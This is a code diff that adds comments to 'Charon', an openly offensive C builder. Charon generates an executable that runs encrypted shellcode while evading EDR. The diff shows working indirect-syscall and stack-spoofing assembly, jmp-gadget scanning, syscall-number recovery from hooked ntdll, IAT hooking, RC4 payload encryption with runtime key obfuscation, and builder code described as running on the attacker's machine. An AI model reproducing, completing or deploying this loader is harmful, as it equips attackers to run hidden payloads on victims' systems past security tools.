@@ -1,3 +1,29 @@
+/*
+ * ======================================================================================
+ *  Charon - Artifact Builder & Obfuscator
+ * ======================================================================================
+ * 
+ *  Purpose:
+ *      Generates a standalone executable (CharonArtifact.exe) designed to execute shellcode
+ *      while evading EDR (Endpoint Detection and Response) hooks.
+ * 
+ *  Key Techniques:
+ *      1. Indirect Syscalls: Bypasses user-mode hooks by executing the 'syscall' instruction
+ *         within the memory space of ntdll.dll, rather than calling the hooked API directly.
+ *      2. Stack Spoofing: Manipulates the stack frame to make the syscall return address 
+ *         point to a legitimate location (a 'gadget' in ntdll or kernel32), hiding the 
+ *         origin of the call.
+ *      3. Dynamic Gadget Search: Scans loaded modules for 'jmp REG' gadgets across all 
+ *         non-volatile registers (RBX, RDI, RSI, R12-R15) to ensure compatibility.
+ *      4. IAT Hooking: Patches the Import Address Table of the running process to 
+ *         redirect standard API calls (like VirtualAlloc) through the evasion engine.
+ *      5. Payload Protection: Uses RC4 encryption and 'KeyGuard' (runtime key calculation)
+ *         to prevent static analysis of the payload.
+ * 
+ *  Author: [Your Name/Handle]
+ * ======================================================================================
+ */
+
 #define _CRT_SECURE_NO_WARNINGS
 #include <stdio.h>
 #include <stdlib.h>
@@ -6,8 +32,10 @@
 #include <windows.h>
 
 // =================================================================================
-//  PART 1: EMBEDDED ASSEMBLY (STACK SPOOFER & INDIRECT SYSCALL)
+//  PART 1: EMBEDDED ASSEMBLY (STACK SPOOFER & INDIRECT SYSCALL ENGINE)
 // =================================================================================
+// This string contains the assembly code that handles the low-level stack manipulation
+// and system call execution. It is written to 'syscalls.asm' and compiled by ML64.
 const char *g_HellHallAsm = 
     "EXTERN qTableAddr:QWORD\n"
     "EXTERN qGadgetAddress:QWORD\n"
@@ -15,6 +43,11 @@ const char *g_HellHallAsm =
     "EXTERN qSavedReg:QWORD\n"
     "EXTERN qSavedRetAddr:QWORD\n"
     ".code\n"
+    
+    // -----------------------------------------------------------------------
+    // SetTableAddr: Configures the engine with necessary pointers.
+    // RCX = Table Address, RDX = Gadget Address, R8 = Gadget Type
+    // -----------------------------------------------------------------------
     "    PUBLIC SetTableAddr\n"
     "    SetTableAddr PROC\n"
     "        mov qTableAddr, rcx\n"
@@ -25,8 +58,17 @@ const char *g_HellHallAsm =
     "        ret\n"
     "    SetTableAddr ENDP\n"
     "\n"
+    
+    // -----------------------------------------------------------------------
+    // SyscallExec: The core evasion routine.
+    // 1. Backs up the register we are about to use for the gadget.
+    // 2. Prepares the stack to look like a legitimate return.
+    // 3. Jumps to the 'jmp REG' gadget in ntdll/kernel32.
+    // -----------------------------------------------------------------------
     "    SyscallExec PROC\n"
-    "        mov r10, rcx\n"
+    "        mov r10, rcx\n"          // Save syscall argument (RCX holds the first arg in x64 fastcall, but syscalls expect it in R10)
+    
+    // Determine which register specific path to take based on the found gadget type
     "        cmp qGadgetType, 0\n"
     "        je UseRBX\n"
     "        cmp qGadgetType, 1\n"
@@ -41,7 +83,10 @@ const char *g_HellHallAsm =
     "        je UseR14\n"
     "        cmp qGadgetType, 6\n"
     "        je UseR15\n"
-    "        jmp UseRBX\n"
+    "        jmp UseRBX\n"            // Default fallback
+    
+    // --- Register Specific Chains ---
+    // Each block saves the register, loads the return address, and jumps to the call execution
     "    UseRBX:\n"
     "        mov qSavedReg, rbx\n"
     "        lea rbx, BackFromKernel\n"
@@ -71,21 +116,26 @@ const char *g_HellHallAsm =
     "        lea r15, BackFromKernel\n"
     "        jmp DoCall\n"
     "\n"
+    
+    // --- Execution Logic ---
     "    DoCall:\n"
     "        push rdx\n"
     "        mov rdx, 20h\n"
     "        mul rdx\n"
     "        mov rdx, qTableAddr\n"
     "        add rdx, rax\n"
-    "        mov rax, [rdx + 08h]\n"
-    "        mov r11, [rdx + 10h]\n"
+    "        mov rax, [rdx + 08h]\n"     // Load SSN (Syscall Number)
+    "        mov r11, [rdx + 10h]\n"     // Load 'syscall; ret' address
     "        pop rdx\n"
     "        pop rcx\n"
-    "        mov qSavedRetAddr, rcx\n"
-    "        mov rcx, r10\n"
-    "        push qGadgetAddress ; Push 'JMP REG' gadget addr\n"
-    "        jmp r11\n"
+    "        mov qSavedRetAddr, rcx\n"   // Save original return address logic
+    "        mov rcx, r10\n"             // Restore first argument
+    "        push qGadgetAddress\n"      // Push the gadget address onto the stack (The 'jmp REG' instruction will return here conceptually)
+    "        jmp r11\n"                  // Jump to 'syscall' instruction
     "\n"
+    
+    // --- Return Logic ---
+    // After the syscall returns, execution flows here. We must restore valid program state.
     "    BackFromKernel:\n"
     "        cmp qGadgetType, 0\n"
     "        je RestRBX\n"
@@ -102,6 +152,8 @@ const char *g_HellHallAsm =
     "        cmp qGadgetType, 6\n"
     "        je RestR15\n"
     "        jmp RestRBX\n"
+    
+    // Restore the non-volatile register we hijacked
     "    RestRBX:\n"
     "        mov rbx, qSavedReg\n"
     "        jmp Fin\n"
@@ -124,31 +176,37 @@ const char *g_HellHallAsm =
     "        mov r15, qSavedReg\n"
     "        jmp Fin\n"
     "    Fin:\n"
-    "        mov r11, qSavedRetAddr\n"
-    "        jmp r11\n"
+    "        mov r11, qSavedRetAddr\n"   // Restore the actual return address
+    "        jmp r11\n"                  // Return to caller
     "    SyscallExec ENDP\n";
 
 // =================================================================================
 //  PART 2: MONOLITHIC C TEMPLATE (THE ARTIFACT)
 // =================================================================================
+// This string contains the source code for the generated artifact. 
+// It is written to 'artifact.c' and compiled.
 const char *g_StubTemplate =
     "#include <windows.h>\n"
     "#include <stdio.h>\n"
     "#include <string.h>\n"
     "\n"
-    "// --- [SECTION 1] GLOBALS FOR ASM ---\n"
-    "void* qTableAddr = NULL;\n"
-    "void* qGadgetAddress = NULL;\n"
-    "DWORD qGadgetType = 0;\n"
-    "void* qSavedReg = NULL;\n"
-    "void* qSavedRetAddr = NULL;\n"
+    
+    // --- [SECTION 1] GLOBALS FOR ASM ---\n"
+    // These globals bridge the C code and the Assembly engine.
+    "void* qTableAddr = NULL;\n"        // Base address of the syscall table
+    "void* qGadgetAddress = NULL;\n"    // Address of the found 'jmp REG' gadget
+    "DWORD qGadgetType = 0;\n"          // Type of gadget found (0=RBX, 1=RDI, etc.)
+    "void* qSavedReg = NULL;\n"         // Space to save the register context
+    "void* qSavedRetAddr = NULL;\n"     // Space to save the return address
     "\n"
-    "// --- [SECTION 2] INTERNAL STRUCTS ---\n"
+    
+    // --- [SECTION 2] INTERNAL STRUCTS ---\n"
+    // Structures to manage syscall entries and Windows internal data
     "typedef struct _SYSCALL_ENTRY {\n"
-    "    PVOID pAddress;      // 0x00\n"
-    "    DWORD64 dwSsn;       // 0x08\n"
-    "    PVOID pSyscallRet;   // 0x10\n"
-    "    DWORD64 dwHash;      // 0x18\n"
+    "    PVOID pAddress;      // 0x00 - Original Address\n"
+    "    DWORD64 dwSsn;       // 0x08 - Syscall Number (SSN)\n"
+    "    PVOID pSyscallRet;   // 0x10 - Address of 'syscall; ret' instruction\n"
+    "    DWORD64 dwHash;      // 0x18 - Hash of the function name\n"
     "} SYSCALL_ENTRY, *PSYSCALL_ENTRY;\n"
     "\n"
     "typedef struct _SYSCALL_LIST {\n"
@@ -156,17 +214,22 @@ const char *g_StubTemplate =
     "    SYSCALL_ENTRY Entries[1024];\n"
     "} SYSCALL_LIST, *PSYSCALL_LIST;\n"
     "\n"
+    // Native definitions needed for traversing PEB (Process Environment Block)
     "typedef struct _USTRING { DWORD Length; DWORD MaximumLength; PVOID Buffer; } USTRING, *PUSTRING;\n"
     "typedef struct _PEB_LDR_DATA { ULONG Length; BOOLEAN Initialized; HANDLE SsHandle; LIST_ENTRY InLoadOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA;\n"
     "typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;\n"
     "typedef struct _PEB { BYTE Reserved[24]; PPEB_LDR_DATA Ldr; } PEB, *PPEB;\n"
     "\n"
-    "// --- GLOBALS ---\n"
+    
+    // --- GLOBALS ---\n"
     "SYSCALL_LIST SyscallList;\n"
     "extern void SetTableAddr(PVOID pTable, PVOID pGadget, DWORD dwType);\n"
-    "extern void Fnc0000(); // Ref to base of stubs\n"
+    "extern void Fnc0000(); // Reference to the base of the assembly stubs\n"
     "\n"
-    "// --- [SECTION 3] HELPERS ---\n"
+    
+    // --- [SECTION 3] HELPERS ---\n"
+    
+    // djb2: Simple hash function for string comparison
     "DWORD64 djb2(PBYTE str) {\n"
     "    DWORD64 dwHash = 0x7734773477347734;\n"
     "    INT c;\n"
@@ -174,6 +237,7 @@ const char *g_StubTemplate =
     "    return dwHash;\n"
     "}\n"
     "\n"
+    // GetNextSyscallInstruction: Scans forward to find valid 'syscall; ret' bytes
     "PVOID GetNextSyscallInstruction(PVOID pAddress) {\n"
     "    for (DWORD i = 0; i <= 32; i++) {\n"
     "        if (*((PBYTE)pAddress + i) == 0x0f && *((PBYTE)pAddress + i + 1) == 0x05 && *((PBYTE)pAddress + i + 2) == 0xc3) {\n"
@@ -183,9 +247,11 @@ const char *g_StubTemplate =
     "    return NULL;\n"
     "}\n"
     "\n"
+    // GetSSN: Extracts the System Service Number from a function address or its neighborhood
     "DWORD64 GetSSN(PVOID pAddress) {\n"
     "    if (*((PBYTE)pAddress) == 0x4c && *((PBYTE)pAddress + 3) == 0xb8) return *((PBYTE)pAddress + 4);\n"
     "    for (WORD idx = 1; idx <= 32; idx++) {\n"
+    "        // Check neighbors if the function is hooked\n"
     "        if (*((PBYTE)pAddress + idx * 32) == 0x4c && *((PBYTE)pAddress + idx * 32 + 3) == 0xb8)\n"
     "            return *((PBYTE)pAddress + idx * 32 + 4) - idx;\n"
     "        if (*((PBYTE)pAddress - idx * 32) == 0x4c && *((PBYTE)pAddress - idx * 32 + 3) == 0xb8)\n"
@@ -194,6 +260,7 @@ const char *g_StubTemplate =
     "    return -1;\n"
     "}\n"
     "\n"
+    // FindGadgetInModule: Scans a module for 'jmp REG' opcodes to use for stack spoofing
     "PVOID FindGadgetInModule(const char* sModule, DWORD* outType) {\n"
     "    PVOID pModule = (PVOID)GetModuleHandleA(sModule);\n"
     "    if (!pModule) return NULL;\n"
@@ -201,10 +268,11 @@ const char *g_StubTemplate =
     "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((ULONG_PTR)pModule + pDos->e_lfanew);\n"
     "    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);\n"
     "    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {\n"
-    "        if (pSection[i].Characteristics & 0x20000020) {\n"
+    "        if (pSection[i].Characteristics & 0x20000020) {\n" // Check for Executable section
     "            PBYTE pStart = (PBYTE)((ULONG_PTR)pModule + pSection[i].VirtualAddress);\n"
     "            DWORD dwSize = pSection[i].Misc.VirtualSize;\n"
     "            for (DWORD z = 0; z < dwSize - 2; z++) {\n"
+    "                // Check for various JMP REG opcodes\n"
     "                // RBX (0): FF E3\n"
     "                if (pStart[z] == 0xFF && pStart[z+1] == 0xE3) { *outType = 0; return (PVOID)(pStart + z); }\n"
     "                // RDI (1): FF E7\n"
@@ -225,7 +293,9 @@ const char *g_StubTemplate =
     "    return NULL;\n"
     "}\n"
     "\n"
-    "// --- [SECTION 4] INIT ENGINE ---\n"
+    
+    // --- [SECTION 4] INIT ENGINE ---\n"
+    // Initialize the API Resolver and Gadget Hunter
     "BOOL InitApi() {\n"
     "    PVOID ntdllBase = GetModuleHandleA(\"ntdll.dll\");\n"
     "    if(!ntdllBase) return FALSE;\n"
@@ -242,7 +312,7 @@ const char *g_StubTemplate =
     "    \n"
     "    DWORD idx = 0;\n"
     "    \n"
-    "    // 1. Find Stack Spoof Gadget\n"
+    "    // 1. Find Stack Spoof Gadget: Try kernel32 first, then ntdll\n"
     "    qGadgetAddress = FindGadgetInModule(\"kernel32.dll\", &qGadgetType);\n"
     "    if(!qGadgetAddress) qGadgetAddress = FindGadgetInModule(\"ntdll.dll\", &qGadgetType);\n"
     "    if(!qGadgetAddress) { printf(\"[!] Gadget not found\\n\"); return FALSE; }\n"
@@ -250,12 +320,13 @@ const char *g_StubTemplate =
     "    printf(\"[+] Found Gadget at %p (Type: %d)\\n\", qGadgetAddress, qGadgetType);\n"
     "    SetTableAddr(SyscallList.Entries, qGadgetAddress, qGadgetType);\n"
     "    \n"
+    "    // 2. Resolve Syscalls: Walk the export table of ntdll\n"
     "    for (WORD i = 0; i < pExport->NumberOfNames; i++) {\n"
     "        PCHAR pcName = (PCHAR)((PBYTE)ntdllBase + pdwNames[i]);\n"
     "        PVOID pAddress = (PBYTE)ntdllBase + pdwFunctions[pwOrdinals[i]];\n"
     "        \n"
     "        USHORT prefix = *(USHORT*)pcName;\n"
-    "        if (prefix != 0x744E && prefix != 0x775A) continue;\n"
+    "        if (prefix != 0x744E && prefix != 0x775A) continue; // Filter for 'Nt' or 'Zw'\n"
     "        \n"
     "        DWORD64 dwSsn = GetSSN(pAddress);\n"
     "        if (dwSsn == -1) continue;\n"
@@ -263,6 +334,7 @@ const char *g_StubTemplate =
     "        PVOID pSyscallRet = GetNextSyscallInstruction(pAddress);\n"
     "        if (!pSyscallRet) continue;\n"
     "        \n"
+    "        // Store entry in our internal list\n"
     "        SyscallList.Entries[idx].pAddress = pAddress;\n"
     "        SyscallList.Entries[idx].dwSsn = dwSsn;\n"
     "        SyscallList.Entries[idx].pSyscallRet = pSyscallRet;\n"
@@ -277,15 +349,16 @@ const char *g_StubTemplate =
     "\n"
     "typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
     "\n"
+    // InstallIATHooks: Redirects Import Address Table entries to use our indirect syscall engine
     "void InstallIATHooks() {\n"
     "    PVOID pModule = GetModuleHandleA(NULL);\n"
     "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;\n"
     "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pModule + pDos->e_lfanew);\n"
     "    if (pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size == 0) return;\n"
     "    \n"
-    "    // Helper for indirect syscall\n"
+    "    // Locate the internal NtProtectVirtualMemory syscall entry\n"
     "    int idxProtect = -1;\n"
-    "    DWORD64 hProt = 0x858BCB1046FB6A37; // NtProtectVirtualMemory\n"
+    "    DWORD64 hProt = 0x858BCB1046FB6A37; // Hash for NtProtectVirtualMemory\n"
     "    for(int i=0; i<SyscallList.Count; i++) {\n"
     "        if(SyscallList.Entries[i].dwHash == hProt) { idxProtect = i; break; }\n"
     "    }\n"
@@ -293,6 +366,7 @@ const char *g_StubTemplate =
     "    PBYTE pStubBase = (PBYTE)&Fnc0000;\n"
     "    fnNtProtectVirtualMemory fProt = (fnNtProtectVirtualMemory)(pStubBase + (idxProtect * 16));\n"
     "\n"
+    "    // Walk Imports\n"
     "    PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pModule + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);\n"
     "    while (pImport->Name) {\n"
     "        char* szModName = (char*)((PBYTE)pModule + pImport->Name);\n"
@@ -305,11 +379,13 @@ const char *g_StubTemplate =
     "                if (!(pOrgThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {\n"
     "                    PIMAGE_IMPORT_BY_NAME pImportName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)pModule + pOrgThunk->u1.AddressOfData);\n"
     "                    DWORD64 dwHash = djb2((PBYTE)pImportName->Name);\n"
+    "                    // If import matches a syscall we know, hook it\n"
     "                    for(DWORD i=0; i < SyscallList.Count; i++) {\n"
     "                        if (SyscallList.Entries[i].dwHash == dwHash) {\n"
     "                            PVOID pCtx = (PVOID)(&pThunk->u1.Function);\n"
     "                            SIZE_T sSize = sizeof(PVOID);\n"
     "                            DWORD oldProtect = 0;\n"
+    "                            // Change protection to RW, Write Hook, Restore Protection\n"
     "                            if(fProt((HANDLE)-1, &pCtx, &sSize, PAGE_READWRITE, &oldProtect) == 0) {\n"
     "                                PVOID pNewFunc = (PVOID)(pStubBase + (i * 16));\n"
     "                                pThunk->u1.Function = (ULONG_PTR)pNewFunc;\n"
@@ -327,7 +403,8 @@ const char *g_StubTemplate =
     "    }\n"
     "}\n"
     "\n"
-    "// --- [SECTION 5] CONFIG & PAYLOAD ---\n"
+    
+    // --- [SECTION 5] CONFIG & PAYLOAD ---\n"
     "#define KEY_SIZE 16\n"
     "#define HINT_BYTE {{HINT_BYTE}}\n"
     "unsigned char Payload[] = { {{PAYLOAD_BYTES}} };\n"
@@ -340,6 +417,8 @@ const char *g_StubTemplate =
     "typedef NTSTATUS (NTAPI *fnTpWaitForWork)(PVOID, BOOLEAN);\n"
     "typedef NTSTATUS (NTAPI *fnTpReleaseWork)(PVOID);\n"
     "\n"
+    
+    // --- [ENTRY POINT] ---\n"
     "int main() {\n"
     "    PVOID pAddr = NULL; SIZE_T sSize = sizeof(Payload); DWORD dwOld = 0; HANDLE hProc = (HANDLE)-1;\n"
     "    \n"
@@ -364,6 +443,7 @@ const char *g_StubTemplate =
     "    if(status != 0) { printf(\"[!] Allocation Failed: 0x%X\\n\", status); return -1; }\n"
     "\n"
     "    printf(\"[+] Decrypting payload...\\n\");\n"
+    "    // KeyGuard: Runtime Key Calculation\n"
     "    int b = 0; while(((Key[0]^b)-0) != HINT_BYTE) b++; \n"
     "    for(int i=0; i<KEY_SIZE; i++) Key[i] = (BYTE)((Key[i]^b)-i);\n"
     "    USTRING k = {KEY_SIZE, KEY_SIZE, Key}; USTRING d = {sSize, sSize, Payload};\n"
@@ -401,6 +481,8 @@ const char *g_StubTemplate =
 // =================================================================================
 //  PART 3: BUILDER LOGIC
 // =================================================================================
+// The following code runs on the attacker's machine to build the artifact.
+
 typedef struct _USTRING_BUILDER {
   DWORD Length;
   DWORD MaximumLength;
@@ -408,6 +490,7 @@ typedef struct _USTRING_BUILDER {
 } USTRING;
 typedef NTSTATUS(NTAPI *fnSystemFunction032)(USTRING *Img, USTRING *Key);
 
+// RC4_Encrypt: Encrypts data using SystemFunction032 (RtlEncryptMemory)
 void RC4_Encrypt(unsigned char *key, DWORD keySize, unsigned char *data, DWORD dataSize) {
   HMODULE hAdvapi = LoadLibraryA("Advapi32.dll");
   if (!hAdvapi) return;
@@ -454,7 +537,6 @@ char *ReplacePattern(const char *original, const char *pattern, const char *repl
 
   size_t newSize = strlen(original) + cnt * (newWlen - oldWlen) + 1;
   char *result = (char *)malloc(newSize);
-  struct _USTRING_BUILDER * u = NULL; // unused
   if (!result) return NULL;
 
   char *dest = result;
@@ -502,6 +584,7 @@ int main(int argc, char *argv[]) {
   for (int i = 0; i < 16; i++) realKey[i] = rand() % 255;
   RC4_Encrypt(realKey, 16, shellcode, shellcodeSize);
 
+  // KeyGuard Logic: Obfuscate the key so it's not present in plaintext strings
   unsigned char b = (rand() % 200) + 1;
   for (int i = 0; i < 16; i++) protectedKey[i] = (unsigned char)((realKey[i] + i) ^ b);
   unsigned char hintByte = protectedKey[0] ^ b;
@@ -515,7 +598,7 @@ int main(int argc, char *argv[]) {
   FILE *fAsm = fopen("syscalls.asm", "w");
   if (fAsm) { 
       fputs(g_HellHallAsm, fAsm);
-      // Append 1024 Stubs
+      // Append 1024 unique stubs to ensure distinct syscall entry points
       for (int i = 0; i < 1024; i++) {
           fprintf(fAsm, "    PUBLIC Fnc%04X\n", i);
           fprintf(fAsm, "    ALIGN 16\n"); 
